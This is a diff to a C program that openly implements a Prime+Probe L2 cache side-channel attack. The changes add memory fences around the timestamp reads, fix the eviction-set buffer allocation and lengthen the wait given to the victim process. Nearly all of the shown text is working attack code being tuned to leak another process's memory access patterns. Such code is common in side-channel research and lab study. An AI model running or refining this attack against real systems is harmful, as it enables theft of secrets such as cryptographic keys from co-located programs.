@@ -16,8 +16,10 @@ volatile uint8_t *buf;
 volatile uint8_t *eviction_sets[NUM_L2_CACHE_SETS][WAYS];
 
 static inline uint64_t rdtsc(){
-    uint32_t lo, hi;
-    __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
+    unsigned hi, lo;
+    asm volatile ("mfence");
+    asm volatile ("rdtsc" : "=a"(lo), "=d"(hi));
+    asm volatile ("mfence");
     return ((uint64_t)hi << 32) | lo;
 }
 
@@ -26,7 +28,7 @@ int main() {
     printf("Attacker ready. Prime+Probe starting...\n");
 
     /* allocate large buffer */
-    posix_memalign((void**)&buf, 4096, STRIDE * WAYS);
+    posix_memalign((void**)&buf, 4096, NUM_L2_CACHE_SETS * STRIDE);
 
     /* build eviction sets */
     for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
@@ -51,7 +53,7 @@ int main() {
             }
 
             /* give victim time */
-            usleep(200);
+            usleep(500);
 
             /* PROBE */
             for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
